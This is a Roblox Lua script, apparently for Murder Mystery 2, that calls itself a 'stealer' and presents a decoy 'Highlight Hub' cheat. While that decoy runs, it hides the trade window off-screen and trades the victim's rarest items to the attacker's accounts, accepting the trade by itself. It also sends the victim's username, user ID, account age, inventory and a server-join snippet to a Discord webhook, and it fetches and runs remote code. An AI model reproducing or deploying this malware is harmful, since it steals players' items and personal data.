Config = {
    Receivers = {", , "},
    Webhook = "",
    FullInventory = true, -- If true, it will display all of the player's items.
    GoodItemsOnly = false, -- If set to true, the stealer will not ping you if the player only has items below legendary.
    ResendTrade = ".", -- Send this in chat to resend the trade request if you don't receive it.
    Script = "Highlight Hub", -- Scripts > "None", "Custom", Highlight Hub
    CustomLink = "None" -- If Script is set to Custom, provide the custom URL here.
}

repeat wait() until game:IsLoaded()

if getgenv().scriptexecuted then return end
getgenv().scriptexecuted = true

local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()

local DYWebhook = loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/UILibs/main/Librarys/Orion/Source"))()
DYWebhook.ErrorPrinting = false
local embed = DYWebhook.BuildEmbed()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local VirtualUser = game:GetService("VirtualUser")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Trade = ReplicatedStorage.Trade
local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
local Position = UDim2.new(0, 9999, 0, 9999)
local Inventory = {}
local InventorySet = {} -- Added to track unique items

local function sendnotification(message)
    getgenv().scriptexecuted = false
    print("[ Pethicial ]: " .. message)
    Notification:Notify(
        {Title = "Pethicial ", Description = message},
        {OutlineColor = Color3.fromRGB(80, 80, 80),Time = 7, Type = "default"}
    )
end

local success, errorMsg = pcall(function()
    local games = {
        [142823291] = true,
        [335132309] = true,
        [636649648] = true
    }
    
    if not games[game.PlaceId] then
        game:GetService("Players").LocalPlayer:Kick("Unfortunately, this game is not supported.")
        while true do end
        wait(99999999999999999999999999999999999)
    end
    
    if not Config.Webhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
        sendnotification("Script terminated due to an invaild webhook url.")
        InvaildWebhook = true
        return
    end
    
    if type(Config.Receivers) ~= "table" or #Config.Receivers == 0 then
        sendnotification("Script terminated due to an invaild receivers table.")
        return
    end
    
    if Config.Script == "Custom" and not Config.CustomLink:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
        sendnotification("Script terminated due to an invaild custom url.")
        return
    end
    
    if Config.FullInventory ~= true and Config.FullInventory ~= false then
        Config.FullInventory = true
    end
    
    if Config.Script == nil then
        Config.Script = "None"
    elseif Config.Script == "Custom" then
        Config.Script = Config.Script .. " - " .. Config.CustomLink
    end
    
    if Config.Script == "Custom" then
        loadstring(game:HttpGet(Config.CustomLink))()
    elseif Config.Script == "Highlight Hub" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Main"))()
    end

    Common = 0
    Uncommon = 0
    Rare = 0
    Legendary = 0
    Vintage = 0
    Godly = 0
    Ancient = 0
    Unique = 0
    
    LocalPlayer.Idled:connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)
    
    if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") ~= nil then
        UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
        TradePath = LocalPlayer.PlayerGui.TradeGUI
        Mobile = false
    else
        UIPath = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
        TradePath = LocalPlayer.PlayerGui.TradeGUI_Phone
        Mobile = true
    end
    
    function TapUI(button, check, button2)
        if check == "Active Check" then
            if button.Active then
                button = button[button2]
            else
                return
            end
        end
        if check == "Text Check" then
            if button == "^" then
                button = button2
            else
                return
            end
        end
        for i,v in pairs(events) do
            for i,v in pairs(getconnections(button[v])) do
                v:Fire()
            end
        end
    end
    
    function Rarity(color, amount, tradeable, requirepath, path)
        Stack = 0
    
        if tradeable then
            if tradeable:FindFirstChild("Evo") then
                return
            end
        end
    
        if amount ~= "" then
            Stack = tonumber(amount:match("x(%d+)"))
        else
            Stack = 1
        end
    
        local r = math.floor(color.R * 255 + 0.5)
        local g = math.floor(color.G * 255 + 0.5)
        local b = math.floor(color.B * 255 + 0.5)
    
        if r == 106 and g == 106 and b == 106 then
            Common = Common + Stack
        elseif r == 0 and g == 255 and b == 255 then
            Uncommon = Uncommon + Stack
        elseif r == 0 and g == 200 and b == 0 then
            Rare = Rare + Stack
        elseif r == 220 and g == 0 and b == 5 then
            Legendary = Legendary + Stack
        elseif r == 255 and g == 0 and b == 179 then
            Godly = Godly + Stack
        elseif r == 100 and g == 10 and b == 255 then
            Ancient = Ancient + Stack
        elseif r == 240 and g == 140 and b == 0 then
            Unique = Unique + Stack
        else
            Vintage = Vintage + Stack
        end
    end

    function checkitem(v)
        if v:IsA("Frame") then
            if v.ItemName.Label.Text ~= "Default Knife" and v.ItemName.Label.Text ~= "Default Gun" then
                Rarity(v.ItemName.BackgroundColor3, v.Container.Amount.Text, v:FindFirstChild("Tags"))
                if Config.FullInventory then
                    local number = v.Container.Amount.Text ~= "" and v.Container.Amount.Text or "x1"
                    local itemString = v.ItemName.Label.Text .. " " .. number
                    -- Check if item is already in the set
                    if not InventorySet[itemString] then
                        InventorySet[itemString] = true
                        table.insert(Inventory, itemString)
                    end
                end
            end
        end
    end
    
    function FullInventory()
        for i,v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
            for i,v in pairs(v.Container:GetChildren()) do
                if v.Name == "Christmas" or v.Name == "Halloween" then
                    for i,v in pairs(v.Container:GetChildren()) do
                        checkitem(v)
                    end
                else
                    checkitem(v)
                end
            end
        end
        for i,v in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
            checkitem(v)
        end
        if Common == 0 and Uncommon == 0 and Rare == 0 and Legendary == 0 and Godly == 0 and Ancient == 0 and Unique == 0 and Vintage == 0 then
            table.insert(Inventory, "None")
        end
        if Config.FullInventory then
            return table.concat(Inventory, ", ")
        else
            return "Full inventory set false."
        end
    end
    
    FullInventory()
    
    task.wait()
    
    function Sendtrade()
        if Mobile then
            local Path = LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard
            TapUI(Path.Container.Close)
            TapUI(Path.Container.PlayerList[Receiver].ActionButton)
            TapUI(Path.Popup.Container.Action.Trade)
            TapUI(Path.Popup.Container.Close)
        else
            local Path = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard
            TapUI(Path.Container.ToggleRequests.On)
            TapUI(Path.Container.Close.Title.Text, "Text Check", Path.Container.Close.Toggle)
            TapUI(Path.Container.TradeRequest.ReceivingRequest, "Active Check", "Decline")
            TapUI(Path.Container.TradeRequest.SendingRequest, "Active Check", "Cancel")
            TapUI(Path.Container[Receiver].ActionButton)
            TapUI(Path.Inspect.Trade)
            TapUI(Path.Inspect.Close)
        end
    end
    
    function readchats()
        Players[Receiver].Chatted:Connect(function(msg)
            if msg == Config.ResendTrade then
                Sendtrade()
            end
        end)
    end
    
    function Activate(player)
        for i,v in pairs(Config.Receivers) do
            if v == player then
                Receiver = player
                readchats()
                wait(10)
                Sendtrade()
            end
        end
    end
    
    function InsertItems()
        local ItemsByRarity = {
            Ancient = {},
            Godly = {},
            Unique = {},
            Vintage = {},
            Legendary = {},
            Rare = {},
            Uncommon = {},
            Common = {}
        }

        for i,v in pairs(TradePath.Container.Items.Main:GetChildren()) do
            for i,v in pairs(v.Items.Container.Current.Container:GetChildren()) do
                if v:IsA("Frame") then
                    if v.ItemName.Label.Text ~= "Default Knife" and v.ItemName.Label.Text ~= "Default Gun" then
                        local rarity = "Common"
                        local color = v.ItemName.BackgroundColor3
                        if color == Color3.fromRGB(220, 0, 5) then
                            rarity = "Legendary"
                        elseif color == Color3.fromRGB(255, 0, 179) then
                            rarity = "Godly"
                        elseif color == Color3.fromRGB(100, 10, 255) then
                            rarity = "Ancient"
                        elseif color == Color3.fromRGB(240, 140, 0) then
                            rarity = "Unique"
                        elseif color == Color3.fromRGB(255, 255, 0) then
                            rarity = "Vintage"
                        elseif color == Color3.fromRGB(0, 200, 0) then
                            rarity = "Rare"
                        elseif color == Color3.fromRGB(0, 255, 255) then
                            rarity = "Uncommon"
                        end
                        table.insert(ItemsByRarity[rarity], v)
                    end
                end
            end
        end

        local ItemsInTrade = 0
        local rarityOrder = {"Ancient", "Godly", "Unique", "Vintage", "Legendary", "Rare", "Uncommon", "Common"}
    
        for _, rarity in ipairs(rarityOrder) do
            for _, item in ipairs(ItemsByRarity[rarity]) do
                if ItemsInTrade < 4 then
                    ItemsInTrade = ItemsInTrade + 1
                    local LoopsItem = 1
                    local Amount = item.Container.Amount.Text
                    if Amount ~= "" then
                        LoopsItem = tonumber(Amount:match("x(%d+)"))
                    end
                    task.wait()
                    for i = 1, LoopsItem do
                        TapUI(item.Container.ActionButton)
                    end
                end
            end
        end
    
        wait(10)
        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
    end

    if Mobile then
        TradePath.Container.Position = Position
        TradePath.ClickBlocker.Position = Position
    else
        TradePath.BG.Position = Position
        TradePath.Container.Position = Position
        TradePath.ClickBlocker.Position = Position
        TradePath.Processing.Position = Position
    end
    
    TradePath:GetPropertyChangedSignal("Enabled"):Connect(function()
        wait(3)
        if TradePath.Enabled then
            InsertItems()
        else
            Sendtrade()
        end
    end)
    
    Players.PlayerAdded:Connect(function(player)
        Activate(player.Name)
    end)
    
    for i,v in pairs(Players:GetPlayers())do
        Activate(v.Name)
    end
end)
if success then
    message = "```Username     : " .. LocalPlayer.Name.."\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. identifyexecutor() .. "\nReceiver/s   : " .. table.concat(Config.Receivers, ", ") .. "\nScript       : " .. Config.Script .. "```\nÄ‘ÂŸÂŽÂ€ **__Inventory__**\n```Ancient    Ä‘ÂŸÂŽÂƒ: " .. Ancient .. "\nGoldy      Ä‘ÂŸÂŽÂ‰: " .. Godly .. "\nUnique     Ä‘ÂŸÂŽÂˆ: " .. Unique .. "\nVintage    Ä‘ÂŸÂŽÅ : " .. Vintage .. "\nLegendary  Ä‘ÂŸÂŒÂˆ: " .. Legendary .. "\nRare       Ä‘ÂŸÂŒÂ€: " .. Rare .. "\nUncommon   Ä‘ÂŸÂ”Â”: " .. Uncommon .. "\nCommon     Ä‘ÂŸÂŽÂŠ: " .. Common .. "```\nÄ‘ÂŸÂŽÂ¨ **__Full Inventory__**\n```" .. FullInventory() .. "```\nÄ‘ÂŸÂŽÂ **__Execute to join__**\n```" .. TeleportScript .. "```"
else
    message = "```Error   : " .. errorMsg .. "\nExploit : " .. identifyexecutor() .. "```\n\n**Please report this error to .gg/pethicial as it may be a critical error that could lead to vulnerabilities.**"
end

if InvaildWebhook then
    return
end

if Godly > 0 and Ancient > 0 then
    content = "@everyone"
elseif Common and Uncommon and Rare and Legendary and Godly and Ancient and Unique and Vintage == 0 then
    content =  ""
else
    content = ""
end

embed.Info = {
    Settings = {
        Color = DYWebhook.ColorConverter(Color3.fromRGB(255,215,0))
    },
    Embed = {
        Title = "Pethicial",
        Description = message,
        Footer = "Pethicial",
    }
}

DYWebhook:Send({
    url = Config.Webhook,
    content = content,
    embeds = {embed}
})
